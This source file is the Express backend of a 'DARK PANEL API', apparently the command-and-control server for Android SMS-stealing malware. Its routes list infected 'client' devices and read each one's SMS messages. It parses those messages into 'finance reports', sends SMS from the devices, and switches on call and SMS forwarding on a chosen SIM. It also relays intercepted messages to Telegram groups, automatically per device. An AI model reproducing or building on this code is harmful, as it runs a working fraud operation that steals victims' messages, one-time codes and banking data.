require("dotenv").config();
const express = require("express");
const cors = require("cors");
const path = require("path");
const { firebaseGet, firebasePut, firebasePatch, firebaseDelete, testConnection } = require("./firebase");
const { createToken, authMiddleware } = require("./auth");
const {
  send2FACode,
  verify2FACode,
  isGlobal2FAEnabled,
  sendLoginAlert,
  getAlertChatId,
} = require("./telegram");
const { adminMiddleware } = require("./admin");
const db = require("./db");
const { buildFinanceReport } = require("./financeParser");
const telegramUser = require("./telegramUser");

function isWebClient(req) {
  return String(req.headers["x-client"] || "").toLowerCase() === "web";
}

const app = express();
app.use(cors());
app.use(express.json({ limit: "2mb" }));

function resolveProject(req, res) {
  const userId = req.user.sub;
  const projectId = req.params.projectId || req.query.projectId;
  if (!projectId) {
    res.status(400).json({ error: "projectId required" });
    return null;
  }
  try {
    const project = db.getFirebaseProject(userId, projectId);
    return project;
  } catch (err) {
    res.status(404).json({ error: err.message });
    return null;
  }
}

app.get("/api/health", (_, res) => {
  res.json({ ok: true, global2FA: isGlobal2FAEnabled() });
});

app.get("/api", (_, res) => {
  res.json({
    name: "DARK PANEL API",
    status: "running",
    panel: "/",
    health: "/api/health",
  });
});

// ─── Admin: create/manage accounts ───────────────────────────
app.post("/api/admin/accounts", adminMiddleware, (req, res) => {
  try {
    const { username, password, twoFactorEnabled, telegramChatId } = req.body || {};
    if (!username || !password) {
      return res.status(400).json({ error: "username and password required" });
    }
    const user = db.createUser({
      username,
      password,
      twoFactorEnabled: twoFactorEnabled ?? false,
      telegramChatId: telegramChatId || null,
    });
    res.status(201).json({ ok: true, user });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.get("/api/admin/accounts", adminMiddleware, (_, res) => {
  res.json({ accounts: db.listUsers() });
});

app.patch("/api/admin/accounts/:userId", adminMiddleware, (req, res) => {
  try {
    const user = db.updateUser(req.params.userId, req.body || {});
    res.json({ ok: true, user });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.delete("/api/admin/accounts/:userId", adminMiddleware, (req, res) => {
  try {
    db.deleteUser(req.params.userId);
    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

function extractLoginMeta(body = {}, req) {
  return {
    deviceId: String(body.deviceId || body.androidId || "").slice(0, 128) || null,
    deviceName: String(body.deviceName || "").slice(0, 128) || null,
    model: String(body.model || "").slice(0, 128) || null,
    client: String(body.client || req.headers["x-client"] || "unknown").slice(0, 32),
  };
}

// ─── Auth ───────────────────────────────────────────────────
app.post("/api/auth/login", async (req, res) => {
  try {
    const { username, password } = req.body || {};
    if (!username || !password) {
      return res.status(400).json({ error: "Username and password required" });
    }
    const user = db.verifyUserPassword(username, password);
    if (!user) {
      return res.status(401).json({ error: "Invalid username or password" });
    }

    const meta = extractLoginMeta(req.body, req);
    const chatId = getAlertChatId(user);
    const needs2FA = user.twoFactorEnabled || isGlobal2FAEnabled();
    if (needs2FA) {
      if (!chatId) {
        return res.status(400).json({ error: "2FA enabled but Telegram chat ID not configured" });
      }
      const sessionId = await send2FACode(user.username, chatId, meta);
      return res.json({ requires2FA: true, sessionId, username: user.username });
    }

    await sendLoginAlert(user.username, chatId, meta);
    const token = createToken(user);
    return res.json({
      token,
      username: user.username,
      userId: user.id,
      firebaseProjects: db.getFirebaseProjects(user.id),
    });
  } catch (err) {
    res.status(500).json({ error: err.message || "Login failed" });
  }
});

app.post("/api/auth/verify-2fa", async (req, res) => {
  try {
    const { sessionId, code } = req.body || {};
    if (!sessionId || !code) {
      return res.status(400).json({ error: "Session ID and code required" });
    }
    const result = verify2FACode(sessionId, code);
    if (!result.ok) {
      return res.status(401).json({ error: result.error });
    }
    const user = db.findUserByUsername(result.username);
    if (!user) {
      return res.status(401).json({ error: "User not found" });
    }
    const meta = { ...(result.meta || {}), ...extractLoginMeta(req.body, req) };
    await sendLoginAlert(user.username, getAlertChatId(user), meta);
    const token = createToken(user);
    res.json({
      token,
      username: user.username,
      userId: user.id,
      firebaseProjects: db.getFirebaseProjects(user.id),
    });
  } catch (err) {
    res.status(500).json({ error: err.message || "2FA verify failed" });
  }
});

app.get("/api/auth/me", authMiddleware, (req, res) => {
  const user = db.findUserById(req.user.sub);
  if (!user) return res.status(404).json({ error: "User not found" });
  res.json({
    username: user.username,
    userId: user.id,
    twoFactorEnabled: !!user.twoFactorEnabled,
    telegramChatId: user.telegramChatId || null,
    telegramBotConnected: !!(user.telegramBot && user.telegramBot.token),
    global2FA: isGlobal2FAEnabled(),
    firebaseProjects: db.getFirebaseProjects(user.id),
  });
});

app.patch("/api/auth/me", authMiddleware, (req, res) => {
  try {
    const { twoFactorEnabled, telegramChatId } = req.body || {};
    const updates = {};
    if (twoFactorEnabled !== undefined) updates.twoFactorEnabled = !!twoFactorEnabled;
    if (telegramChatId !== undefined) {
      const id = String(telegramChatId || "").trim();
      updates.telegramChatId = id || null;
    }
    if (updates.twoFactorEnabled) {
      const current = db.findUserById(req.user.sub);
      const chat =
        updates.telegramChatId !== undefined
          ? updates.telegramChatId
          : current?.telegramChatId;
      if (!chat && !process.env.TELEGRAM_CHAT_ID) {
        return res.status(400).json({
          error: "2FA on karne se pehle apna Telegram Chat ID save karo",
        });
      }
    }
    const user = db.updateUser(req.user.sub, updates);
    res.json({
      ok: true,
      username: user.username,
      userId: user.id,
      twoFactorEnabled: !!user.twoFactorEnabled,
      telegramChatId: user.telegramChatId || null,
    });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// ─── Firebase Projects (per user) ───────────────────────────
app.get("/api/firebase-projects", authMiddleware, (req, res) => {
  try {
    const projects = db.getFirebaseProjects(req.user.sub, isWebClient(req));
    res.json({ projects });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/firebase-projects", authMiddleware, async (req, res) => {
  try {
    const { name, firebaseUrl, firebaseSecret } = req.body || {};
    const web = isWebClient(req);
    const project = db.addFirebaseProject(
      req.user.sub,
      { name, firebaseUrl, firebaseSecret },
      web
    );
    const full = db.getFirebaseProject(req.user.sub, project.id);
    await testConnection(full.firebaseUrl, full.firebaseSecret);
    res.status(201).json({ ok: true, project });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.put("/api/firebase-projects/:projectId", authMiddleware, async (req, res) => {
  try {
    const web = isWebClient(req);
    const project = db.updateFirebaseProject(
      req.user.sub,
      req.params.projectId,
      req.body || {},
      web
    );
    const full = db.getFirebaseProject(req.user.sub, project.id);
    await testConnection(full.firebaseUrl, full.firebaseSecret);
    res.json({ ok: true, project });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.delete("/api/firebase-projects/:projectId", authMiddleware, (req, res) => {
  try {
    db.deleteFirebaseProject(req.user.sub, req.params.projectId);
    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post("/api/firebase-projects/:projectId/test", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    await testConnection(project.firebaseUrl, project.firebaseSecret);
    res.json({ ok: true, message: "Connection successful" });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// ─── Firebase data (scoped to project) ──────────────────────
app.get("/api/projects/:projectId/dashboard", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    const clients = await firebaseGet(project.firebaseUrl, project.firebaseSecret, "clients");
    const deviceIds = clients ? Object.keys(clients) : [];
    const messages = {};
    for (const id of deviceIds.slice(0, 50)) {
      try {
        messages[id] = await firebaseGet(project.firebaseUrl, project.firebaseSecret, `messages/${id}`);
        if (messages[id] == null) messages[id] = {};
      } catch {
        messages[id] = {};
      }
    }
    res.json({
      project: { id: project.id, name: project.name },
      clients: clients || {},
      messages,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/projects/:projectId/clients", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    const data = await firebaseGet(project.firebaseUrl, project.firebaseSecret, "clients");
    res.json(data || {});
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/projects/:projectId/clients/:id", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    const data = await firebaseGet(project.firebaseUrl, project.firebaseSecret, `clients/${req.params.id}`);
    res.json(data || null);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete("/api/projects/:projectId/clients/:id", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    await firebaseDelete(project.firebaseUrl, project.firebaseSecret, `clients/${req.params.id}`);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/projects/:projectId/messages/:deviceId", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    const data = await firebaseGet(
      project.firebaseUrl,
      project.firebaseSecret,
      `messages/${req.params.deviceId}`
    );
    res.json(data || {});
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/projects/:projectId/finance/:deviceId", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    const messages = await firebaseGet(
      project.firebaseUrl,
      project.firebaseSecret,
      `messages/${req.params.deviceId}`
    );
    const report = buildFinanceReport(messages);
    res.json({
      deviceId: req.params.deviceId,
      projectName: project.name,
      ...report,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/projects/:projectId/clients/:id/send-sms", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    const { from, to, message } = req.body || {};
    if (!to || !message) {
      return res.status(400).json({ error: "to and message required" });
    }
    await firebasePut(project.firebaseUrl, project.firebaseSecret, `clients/${req.params.id}/webhookEvent/sendSms`, {
      from: from || 1,
      to,
      message,
      isSended: false,
    });
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.patch("/api/projects/:projectId/clients/:id/notes", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    const { notes } = req.body || {};
    await firebasePatch(project.firebaseUrl, project.firebaseSecret, `clients/${req.params.id}`, {
      notes: String(notes || ""),
    });
    res.json({ ok: true, notes: String(notes || "") });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/projects/:projectId/clients/:id/forwarding", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    const { type, sim, to, active } = req.body || {};
    if (!type || !["call", "sms"].includes(String(type).toLowerCase())) {
      return res.status(400).json({ error: "type must be call or sms" });
    }
    const simSlot = Number(sim) === 2 ? 2 : 1;
    const isActive = active !== false;
    const payload = {
      type: String(type).toLowerCase(),
      sim: simSlot,
      to: String(to || ""),
      active: isActive,
      isSended: false,
    };
    await firebasePut(
      project.firebaseUrl,
      project.firebaseSecret,
      `clients/${req.params.id}/webhookEvent/forwarding`,
      payload
    );
    const statusField = type === "call" ? "callForward" : "smsForward";
    await firebasePatch(project.firebaseUrl, project.firebaseSecret, `clients/${req.params.id}`, {
      [statusField]: isActive ? String(to || "active") : "inactive",
      forwardTo: String(to || ""),
    });
    res.json({ ok: true, ...payload });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/projects/:projectId/clients/:id/forwarding", authMiddleware, async (req, res) => {
  const project = resolveProject(req, res);
  if (!project) return;
  try {
    const client = await firebaseGet(
      project.firebaseUrl,
      project.firebaseSecret,
      `clients/${req.params.id}`
    );
    if (!client) return res.json({ call: "inactive", sms: "inactive", forwardTo: "" });
    const call = client.callForward || client.call_forward || "inactive";
    const sms = client.smsForward || client.sms_forward || "inactive";
    res.json({
      call: String(call).toLowerCase() === "inactive" ? "inactive" : "active",
      sms: String(sms).toLowerCase() === "inactive" ? "inactive" : "active",
      forwardTo: client.forwardTo || client.forward_to || "",
      sims: client.sims || null,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── User Telegram bot (SMS auto / groups) ──────────────────
app.get("/api/telegram/bot", authMiddleware, (req, res) => {
  try {
    const user = db.findUserById(req.user.sub);
    if (!user) return res.status(404).json({ error: "User not found" });
    const info = telegramUser.sanitizeBot(user);
    if (info.connected) {
      const bot = db.getTelegramBot(req.user.sub);
      info.webhookUrl = telegramUser.webhookUrlFor(req, req.user.sub, bot.webhookSecret);
    }
    res.json(info);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/telegram/bot", authMiddleware, async (req, res) => {
  try {
    const { token } = req.body || {};
    const info = await telegramUser.connectBot(req.user.sub, token, req);
    res.json({ ok: true, ...info });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post("/api/telegram/bot/webhook", authMiddleware, async (req, res) => {
  try {
    const result = await telegramUser.refreshWebhook(req.user.sub, req);
    res.json(result);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.delete("/api/telegram/bot", authMiddleware, async (req, res) => {
  try {
    const result = await telegramUser.disconnectBot(req.user.sub);
    res.json({ ok: true, ...result });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.get("/api/telegram/groups", authMiddleware, (req, res) => {
  try {
    const user = db.findUserById(req.user.sub);
    if (!user) return res.status(404).json({ error: "User not found" });
    const groups = telegramUser.sanitizeBot(user).groups;
    const deviceId = req.query.deviceId;
    const binding = deviceId
      ? telegramUser.findDeviceAutoSend(req.user.sub, deviceId)
      : null;
    res.json({ groups, binding });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/telegram/groups/refresh", authMiddleware, async (req, res) => {
  try {
    const result = await telegramUser.refreshGroupTitles(req.user.sub);
    res.json(result);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post("/api/telegram/groups", authMiddleware, async (req, res) => {
  try {
    const { chatId, title, type } = req.body || {};
    if (!chatId) return res.status(400).json({ error: "chatId required" });
    const row = telegramUser.upsertGroup(req.user.sub, { chatId, title, type: type || "group" });
    res.status(201).json({ ok: true, group: row });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.delete("/api/telegram/groups/:chatId", authMiddleware, (req, res) => {
  try {
    telegramUser.deleteGroup(req.user.sub, req.params.chatId);
    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post("/api/telegram/groups/:chatId/auto-send", authMiddleware, (req, res) => {
  try {
    const { projectId, deviceId, deviceName } = req.body || {};
    if (!projectId || !deviceId) {
      return res.status(400).json({ error: "projectId and deviceId required" });
    }
    db.getFirebaseProject(req.user.sub, projectId);
    // one device → one group (clear previous binds for this device)
    telegramUser.clearDeviceAutoSend(req.user.sub, deviceId);
    const g = telegramUser.setGroupAutoSend(req.user.sub, req.params.chatId, {
      projectId,
      deviceId,
      deviceName: deviceName || deviceId,
    });
    res.json({ ok: true, group: g });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.delete("/api/telegram/groups/:chatId/auto-send", authMiddleware, (req, res) => {
  try {
    const g = telegramUser.setGroupAutoSend(req.user.sub, req.params.chatId, null);
    res.json({ ok: true, group: g });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.delete("/api/telegram/auto-send", authMiddleware, (req, res) => {
  try {
    const deviceId = req.query.deviceId || req.body?.deviceId;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
    const result = telegramUser.clearDeviceAutoSend(req.user.sub, deviceId);
    res.json(result);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post("/api/telegram/groups/:chatId/send-intercept", authMiddleware, async (req, res) => {
  try {
    const { to, message } = req.body || {};
    if (!to || !message) return res.status(400).json({ error: "to and message required" });
    await telegramUser.postInterceptToGroup(req.user.sub, req.params.chatId, to, message);
    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

app.post("/api/telegram/webhook/:userId/:secret", async (req, res) => {
  try {
    const headerSecret = req.headers["x-telegram-bot-api-secret-token"];
    const result = await telegramUser.handleWebhook(
      req.params.userId,
      req.params.secret,
      req.body || {},
      headerSecret
    );
    res.json(result);
  } catch (err) {
    res.status(200).json({ ok: false, error: err.message });
  }
});

app.get("/", (_, res) => {
  res.sendFile(path.join(__dirname, "..", "public", "panel.html"));
});

app.use(express.static(path.join(__dirname, "..", "public")));

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`DARK PANEL API running on port ${port}`);
  console.log(`Web Panel: http://localhost:${port}/`);
  console.log(`Admin key: ${process.env.ADMIN_KEY ? "SET" : "NOT SET — set ADMIN_KEY in .env"}`);
  console.log(`Global 2FA: ${isGlobal2FAEnabled() ? "ON" : "OFF"}`);
});
